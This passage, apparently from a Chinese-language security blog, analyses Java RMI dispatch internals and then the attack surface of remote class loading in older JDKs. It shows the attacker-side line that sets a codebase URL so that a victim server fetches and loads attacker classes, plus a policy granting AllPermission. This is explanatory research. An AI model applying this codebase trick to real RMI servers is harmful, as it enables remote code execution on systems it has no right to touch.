class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 RMI 1.1 存根/骨架（Stub/Skeleton）协议在服务器端进行调度。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 该路径以“操作编号（op）+ 方法哈希（hash）”为依据，将请求分发给骨架处理：</span></span><br><span class="line"><span class="comment"> * 1) 从调用流获取输入；2)（必要时）调整类解析策略；3) 读取方法哈希等头部字段；</span></span><br><span class="line"><span class="comment"> * 4)（可选）解组自定义调用数据；5) 调用骨架的 &#123;<span class="doctag">@code</span> dispatch&#125; 执行目标方法并写回结果/异常。</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;DGC 特殊处理：&lt;/b&gt;若当前骨架为 &#123;<span class="doctag">@code</span> DGCImpl_Skel&#125;（通过反射检测），</span></span><br><span class="line"><span class="comment"> * 则对反序列化输入流调用 &#123;<span class="doctag">@code</span> useCodebaseOnly()&#125;，使其在类解析时只依据</span></span><br><span class="line"><span class="comment"> * 远端提供的代码库注解（而不是回退到栈上的其他类加载器）。这有助于在旧协议下</span></span><br><span class="line"><span class="comment"> * 保持一致的加载语义并降低上下文类加载器干扰。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;异常处理：&lt;/b&gt;本方法抛出的异常由上层捕获后进行 RMI 语义的封装并回传给客户端。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj  目标远程对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> call 调用上下文（含输入/输出流）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> op   操作编号（旧协议下的方法索引；真正匹配仍依赖方法哈希）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception 读取头部/反序列化/分发失败等异常</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">oldDispatch</span><span class="params">(Remote obj, RemoteCall call, <span class="type">int</span> op)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">long</span> hash;  <span class="comment">// 存根与骨架匹配的 64-bit 方法哈希</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 获取输入流：用于读取头部与后续参数</span></span><br><span class="line">    <span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 2) 若骨架为 DGCImpl_Skel，则仅按“远端代码库”解析类，避免使用栈上的其他类加载器</span></span><br><span class="line">        <span class="comment">//    使用反射是为了避免对 DGCImpl_Skel 的编译期强依赖（兼容不同构建/版本）。</span></span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;sun.rmi.transport.DGCImpl_Skel&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (clazz.isAssignableFrom(skel.getClass())) &#123;</span><br><span class="line">            <span class="comment">// 仅当骨架类型兼容时才调整解析策略</span></span><br><span class="line">            ((MarshalInputStream) in).useCodebaseOnly();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ignore) &#123;</span><br><span class="line">        <span class="comment">// 目标环境可能无该类（例如裁剪构建/新版本移除 skeleton），忽略即可</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 委托骨架按 (op, hash) 完成参数解组、目标方法调用与结果/异常写回</span></span><br><span class="line">    <span class="comment">//    该调用内抛出的异常会继续冒泡到上层，由上层统一封装回传客户端。</span></span><br><span class="line">    skel.dispatch(obj, call, op, hash);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>DGCImpl_Skel#dispatch</code> 中对应 <code>clean</code> 和 <code>dirty</code> 两种请求的处理都涉及对参数的反序列化。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * DGCImpl 的 Skeleton 分发入口（RMI 1.1 / JRMP 旧协议风格）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;职责：校验接口签名哈希 → 解组参数 → 调用目标方法 → 组装并写回返回值。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;方法编号（opnum）约定：&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;0 → &#123;<span class="doctag">@code</span> clean(ObjID[], long, VMID, boolean)&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;1 → &#123;<span class="doctag">@code</span> dirty(ObjID[], long, Lease)&#125;&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * 非法编号会抛出 &#123;<span class="doctag">@link</span> java.rmi.UnmarshalException&#125;（&quot;invalid method number&quot;）。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;接口哈希：&lt;/b&gt;入参 &#123;<span class="doctag">@code</span> hash&#125; 必须等于本地 &#123;<span class="doctag">@code</span> interfaceHash&#125;，</span></span><br><span class="line"><span class="comment"> * 以确保客户端存根与服务端骨架/接口版本匹配，否则抛出</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> java.rmi.server.SkeletonMismatchException&#125;。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;&lt;b&gt;异常约定：&lt;/b&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;参数解组异常 → 调用 &#123;<span class="doctag">@code</span> discardPendingRefs()&#125; 丢弃挂起远端引用，然后抛</span></span><br><span class="line"><span class="comment"> *       &#123;<span class="doctag">@link</span> java.rmi.UnmarshalException&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;返回值编组异常 → 抛 &#123;<span class="doctag">@link</span> java.rmi.MarshalException&#125;。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;被调方法抛出的运行时异常/错误 → 由外围调用链按 RMI 语义进一步包装/回传。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment"> * &lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> obj      远程对象实例（应为 DGCImpl）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> remoteCall 传输层封装的本次远程调用（含编组流）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> opnum    方法编号（见上）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> hash     接口签名哈希（用于版本/兼容性校验）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception 见上面的异常约定</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(java.rmi.Remote obj,</span></span><br><span class="line"><span class="params">                     java.rmi.server.RemoteCall remoteCall,</span></span><br><span class="line"><span class="params">                     <span class="type">int</span> opnum, <span class="type">long</span> hash)</span> <span class="keyword">throws</span> java.lang.Exception &#123;</span><br><span class="line">    <span class="comment">// 1) 接口哈希校验：确保 stub 与 skeleton/接口定义一致</span></span><br><span class="line">    <span class="keyword">if</span> (hash != interfaceHash) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.server.SkeletonMismatchException(<span class="string">&quot;interface hash mismatch&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 类型收窄：将通用 Remote/RemoteCall 转为具体实现以使用其特性</span></span><br><span class="line">    sun.rmi.transport.<span class="type">DGCImpl</span> <span class="variable">server</span> <span class="operator">=</span> (sun.rmi.transport.DGCImpl) obj;</span><br><span class="line">    <span class="type">StreamRemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> (StreamRemoteCall) remoteCall;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 按方法编号分派</span></span><br><span class="line">    <span class="keyword">switch</span> (opnum) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">// clean(ObjID[], long, VMID, boolean)</span></span><br><span class="line">        &#123;</span><br><span class="line">            java.rmi.server.ObjID[] $param_arrayOf_ObjID_1;</span><br><span class="line">            <span class="type">long</span> $param_long_2;</span><br><span class="line">            java.rmi.dgc.VMID $param_VMID_3;</span><br><span class="line">            <span class="type">boolean</span> $param_boolean_4;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// —— 参数解组：顺序必须与客户端写入一致 ——</span></span><br><span class="line">                java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">                $param_arrayOf_ObjID_1 = (java.rmi.server.ObjID[]) in.readObject();</span><br><span class="line">                $param_long_2 = in.readLong();</span><br><span class="line">                $param_VMID_3 = (java.rmi.dgc.VMID) in.readObject();</span><br><span class="line">                $param_boolean_4 = in.readBoolean();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassCastException | java.io.IOException | ClassNotFoundException e) &#123;</span><br><span class="line">                <span class="comment">// 解组失败：丢弃挂起引用，抛 UnmarshalException</span></span><br><span class="line">                call.discardPendingRefs();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="comment">// 输入流在参数读取完毕后尽早释放</span></span><br><span class="line">                call.releaseInputStream();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// —— 实际调用：租约清理 —— </span></span><br><span class="line">            server.clean($param_arrayOf_ObjID_1, $param_long_2, $param_VMID_3, $param_boolean_4);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 无返回值：仅获取“正常返回”结果流以写入协议标记并完成返回</span></span><br><span class="line">                call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="comment">// 注意：此时已标记“正常返回”，再抛异常会让上层按返回编组失败处理</span></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// dirty(ObjID[], long, Lease)</span></span><br><span class="line">        &#123;</span><br><span class="line">            java.rmi.server.ObjID[] $param_arrayOf_ObjID_1;</span><br><span class="line">            <span class="type">long</span> $param_long_2;</span><br><span class="line">            java.rmi.dgc.Lease $param_Lease_3;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// —— 参数解组 —— </span></span><br><span class="line">                java.io.<span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line">                $param_arrayOf_ObjID_1 = (java.rmi.server.ObjID[]) in.readObject();</span><br><span class="line">                $param_long_2 = in.readLong();</span><br><span class="line">                $param_Lease_3 = (java.rmi.dgc.Lease) in.readObject();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassCastException | java.io.IOException | ClassNotFoundException e) &#123;</span><br><span class="line">                call.discardPendingRefs();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;error unmarshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                call.releaseInputStream();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// —— 实际调用：续租 —— </span></span><br><span class="line">            java.rmi.dgc.<span class="type">Lease</span> <span class="variable">$result</span> <span class="operator">=</span></span><br><span class="line">                server.dirty($param_arrayOf_ObjID_1, $param_long_2, $param_Lease_3);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 正常返回：写回 Lease 结果对象</span></span><br><span class="line">                java.io.<span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">true</span>);</span><br><span class="line">                out.writeObject($result);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.MarshalException(<span class="string">&quot;error marshalling return&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 未知方法编号：协议/版本不匹配或客户端错误</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.rmi.UnmarshalException(<span class="string">&quot;invalid method number&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="RMI-攻击面"><a href="#RMI-攻击面" class="headerlink" title="RMI 攻击面"></a>RMI 攻击面</h2><h3 id="远程类加载（6u45-7u21-前）"><a href="#远程类加载（6u45-7u21-前）" class="headerlink" title="远程类加载（6u45&#x2F;7u21 前）"></a>远程类加载（6u45&#x2F;7u21 前）</h3><p>RMI 的一个特点就是动态加载类，如果当前 JVM 中没有某个类的定义，它可以从远程 URL 去下载这个类的 class。</p>
<p>例如当客户端调用远程方法时，参数对象会被序列化后传输到服务器端。为了成功传输和处理这些对象，服务器端需要能够反序列化客户端传递的对象。如果服务器端的类路径中没有相应的类，反序列化就会失败，抛出 <code>ClassNotFoundException</code>。</p>
<p>为了解决这个问题，RMI 提供了一种 <strong>动态类加载</strong> 机制。当客户端传递的对象在服务器端找不到时，服务器会根据配置自动从指定的位置加载相应的类字节码。这通常是通过设置 <code>java.rmi.server.codebase</code> 属性来实现的，并且服务端和客户端都支持这个功能。</p>
<h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><p><code>java.rmi.server.codebase</code> 属性可以在 Java 代码中通过 Java 启动参数 <code>-Djava.rmi.server.codebase=&quot;http://127.0.0.1:8000/&quot;</code> 来设置，也可以使用如下代码设置：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);`</span><br></pre></td></tr></table></figure></div>


  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content markdown-body">
      <p><strong>老版本 JDK（6u45&#x2F;7u21 之前）</strong> 的默认配置下，<strong>客户端把“代码库（codebase）URL”作为序列化注解写进了 RMI 数据流</strong>；服务器在反序列化时会<strong>读取这个注解</strong>，并把它当作<strong>该类的远程加载位置</strong>来用，从而去这个 URL 下载类。</p>

    </div>
  </div>

<p>然而无论是客户端还是服务端要远程加载类时，出于安全考虑，会进行一系列权限控制。这些控制由 <strong>Java 安全管理器</strong> (<code>SecurityManager</code>) 和 <strong>安全策略文件</strong>（<code>java.security.policy</code>）决定。</p>
<p>首先是 Java 安全管理器，因为我们通过网络加载外部类并执行方法，所以我们必须要有一个安全管理器来进行管理，如果没有设置安全管理，则 RMI 不会动态加载任何类。通常我们使用如下代码设置安全管理器：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果没有安全管理器，则创建并设置一个新的安全管理器实例。</span></span><br><span class="line"><span class="keyword">if</span> (System.getSecurityManager() == <span class="literal">null</span>) &#123;</span><br><span class="line">    System.setSecurityManager(<span class="keyword">new</span> <span class="title class_">RMISecurityManager</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>另外我们还需要设置 <strong><code>java.security.policy</code></strong> 为指定的安全策略文件文件来确保 <strong>动态类加载</strong> 能够正常工作并且不引发安全异常。</p>
<p><code>java.security.policy</code> 可以使用启动参数 <code>-Djava.security.policy=rmi.policy</code> 来指定，也可以使用如下代码指定：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.security.policy&quot;</span>, RMIServer.class.getClassLoader().getResource(<span class="string">&quot;rmi.policy&quot;</span>).toString());</span><br></pre></td></tr></table></figure></div>

<p>在安全策略文件（这里我们指定为 <code>rmi.policy</code>）中需要授予执行 RMI 相关操作的权限。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grant &#123;</span><br><span class="line">    permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>我们在客户端 RMI 远程调用时传入了一个服务端不存在的类对象 <code>Calc</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello.sayHello(<span class="keyword">new</span> <span class="title class_">Calc</span>());</span><br></pre></td></tr></table></figure></div>

<p>服务端在反序列时 <code>Calc</code> 对象时发现 <code>Calc</code> 类不存在，于是会从 <code>java.rmi.server.codebase</code> 指定的 URL 中寻找 <code>Calc.class</code> 并加载。加载完 <code>Calc.class</code> 便会对传入的 <code>Calc</code> 对象参数进行反序列化。</p>
<h4 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h4><p>反序列化触发类加载的调用栈如下：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">findClass:361, URLClassLoader (java.net)</span><br><span class="line">loadClass:424, ClassLoader (java.lang)</span><br><span class="line">loadClass:411, ClassLoader (java.lang)</span><br><span class="line">loadClass:349, Launcher$AppClassLoader (sun.misc)</span><br><span class="line">loadClass:411, ClassLoader (java.lang)</span><br><span class="line">loadClass:1207, LoaderHandler$Loader (sun.rmi.server)</span><br><span class="line">loadClass:357, ClassLoader (java.lang)</span><br><span class="line">forName0:-1, Class (java.lang)</span><br><span class="line">forName:348, Class (java.lang)</span><br><span class="line">loadClassForName:1221, LoaderHandler (sun.rmi.server)</span><br><span class="line">loadClass:453, LoaderHandler (sun.rmi.server)</span><br><span class="line">loadClass:186, LoaderHandler (sun.rmi.server)</span><br><span class="line">loadClass:637, RMIClassLoader$2 (java.rmi.server)</span><br><span class="line">loadClass:264, RMIClassLoader (java.rmi.server)</span><br><span class="line">resolveClass:219, MarshalInputStream (sun.rmi.server)</span><br><span class="line">readNonProxyDesc:1868, ObjectInputStream (java.io)</span><br><span class="line">readClassDesc:1751, ObjectInputStream (java.io)</span><br><span class="line">readOrdinaryObject:2042, ObjectInputStream (java.io)</span><br><span class="line">readObject0:1573, ObjectInputStream (java.io)</span><br><span class="line">readObject:431, ObjectInputStream (java.io)</span><br><span class="line">unmarshalValue:322, UnicastRef (sun.rmi.server)</span><br><span class="line">unmarshalParametersUnchecked:628, UnicastServerRef (sun.rmi.server)</span><br><span class="line">unmarshalParameters:616, UnicastServerRef (sun.rmi.server)</span><br><span class="line">dispatch:338, UnicastServerRef (sun.rmi.server)</span><br><span class="line">run:200, Transport$1 (sun.rmi.transport)</span><br><span class="line">run:197, Transport$1 (sun.rmi.transport)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">serviceCall:196, Transport (sun.rmi.transport)</span><br><span class="line">handleMessages:573, TCPTransport (sun.rmi.transport.tcp)</span><br><span class="line">run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">run:-1, 1367380156 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)</span><br><span class="line">doPrivileged:-1, AccessController (java.security)</span><br><span class="line">run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)</span><br><span class="line">runWorker:1149, ThreadPoolExecutor (java.util.concurrent)</span><br><span class="line">run:624, ThreadPoolExecutor$Worker (java.util.concurrent)</span><br><span class="line">run:748, Thread (java.lang)</span><br></pre></td></tr></table></figure></div>

<p>我们发现实际上通过 URL 远程加载类的类加载器是 <code>sun.rmi.server.LoaderHandler$Loader</code> 这个类加载器是 <code>URLClassLoader</code> 的子类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Loader 是由 RMIClassLoader 的静态方法创建的</span></span><br><span class="line"><span class="comment"> * RMI 类加载器的实际实现类。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 它继承自 URLClassLoader，具备从指定 URL（如 codebase）加载类的能力。</span></span><br><span class="line"><span class="comment"> * 这个 Loader 会被用于在远程调用中根据传递过来的 codebase URL</span></span><br><span class="line"><span class="comment"> * 动态加载类或接口，从而实现跨 JVM 的类型传输与反序列化。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Loader</span> <span class="keyword">extends</span> <span class="title class_">URLClassLoader</span> &#123;</span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中在 <code>MarshalInputStream#resolveClass</code> 中，<code>readLocation</code> 可以读取我们指定的 <code>codebase</code>。我们只需要在攻击方添加如下代码设置 <code>codebase</code>，那么被攻击方在执行 <code>readLocation</code> 时就可以得到攻击方的 <code>codebase</code> 然后到攻击方指定的 url 上加载类。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.setProperty(<span class="string">&quot;java.rmi.server.codebase&quot;</span>, <span class="string">&quot;http://127.0.0.1:8000/&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>不过这需要 <code>useCodebaseOnly</code> 是为 <code>false</code> 才能远程指定任意 <code>codebase</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回类在流中的位置注解（location）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 该方法可以被子类重写，以实现从其他位置读取注解信息的机制；</span></span><br><span class="line"><span class="comment"> * 本类默认的实现是直接从输入流中读取下一个对象。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 在 RMI 的场景中，这个注解通常是一个 codebase URL 字符串，</span></span><br><span class="line"><span class="comment"> * 用于指示类定义应当从哪里加载。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 一个 Object 类型的注解（通常为 String 类型的 URL）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException 如果读取过程中发生 I/O 错误</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException 如果反序列化注解对象失败</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readLocation</span><span class="params">()</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span 